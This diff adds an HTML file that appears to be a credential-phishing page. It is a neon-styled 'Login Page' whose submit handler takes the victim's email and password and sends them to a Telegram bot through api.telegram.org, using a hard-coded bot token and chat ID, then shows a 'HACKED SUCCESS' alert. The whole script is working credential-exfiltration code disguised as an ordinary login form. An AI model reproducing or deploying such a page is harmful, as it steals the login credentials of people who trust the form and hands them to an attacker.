@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #121212;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .neon-border {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: radial-gradient(circle, transparent, rgba(155, 89, 182, 0.1));
+            animation: neon-border 5s linear infinite;
+        }
+
+        @keyframes neon-border {
+            0% {
+                box-shadow: 0 0 10px #9b59b6, 0 0 20px #9b59b6, 0 0 30px #8e44ad, 0 0 50px #8e44ad;
+            }
+            50% {
+                box-shadow: 0 0 20px #9b59b6, 0 0 40px #8e44ad, 0 0 60px #9b59b6, 0 0 80px #8e44ad;
+            }
+            100% {
+                box-shadow: 0 0 10px #9b59b6, 0 0 20px #8e44ad, 0 0 30px #9b59b6, 0 0 50px #8e44ad;
+            }
+        }
+
+        .login-container {
+            text-align: center;
+            background: #1e1e2f;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+            z-index: -1;
+            filter: blur(15px);
+        }
+
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #9b59b6, 0 0 20px #8e44ad;
+        }
+
+        .logo {
+            width: 100px;
+            margin: 0 auto 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            background: #2c2c3d;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 15px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            box-shadow: 0 0 10px rgba(155, 89, 182, 0.5);
+        }
+
+        input::placeholder {
+            color: #888;
+        }
+
+        button {
+            background: #9b59b6;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            padding: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 10px rgba(155, 89, 182, 0.5);
+        }
+
+        button:hover {
+            background: #8e44ad;
+            box-shadow: 0 0 20px #9b59b6, 0 0 30px #8e44ad;
+        }
+    </style>
+</head>
+<body>
+    <div class="neon-border"></div>
+    <div class="login-container">
+        <img src="cy.png" alt="Logo" class="logo">
+        <h1>Login</h1>
+        <form id="login-form">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            // Ambil data dari input
+            const email = e.target.email.value;
+            const password = e.target.password.value;
+
+            // Data bot Telegram
+            const BOT_TOKEN = '7923463845:AAH5CWRncjDvoyeNUCtLBRbbNwyOJCWkLDE';
+            const CHAT_ID = '-1002118462123';
+
+            // Kirim pesan ke Telegram
+            const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(url);
+                alert('HACKED SUCCESS');
+            } catch (error) {
+                alert('Not valid!');
+            }
+        });
+    </script>
+</body>
+</html>
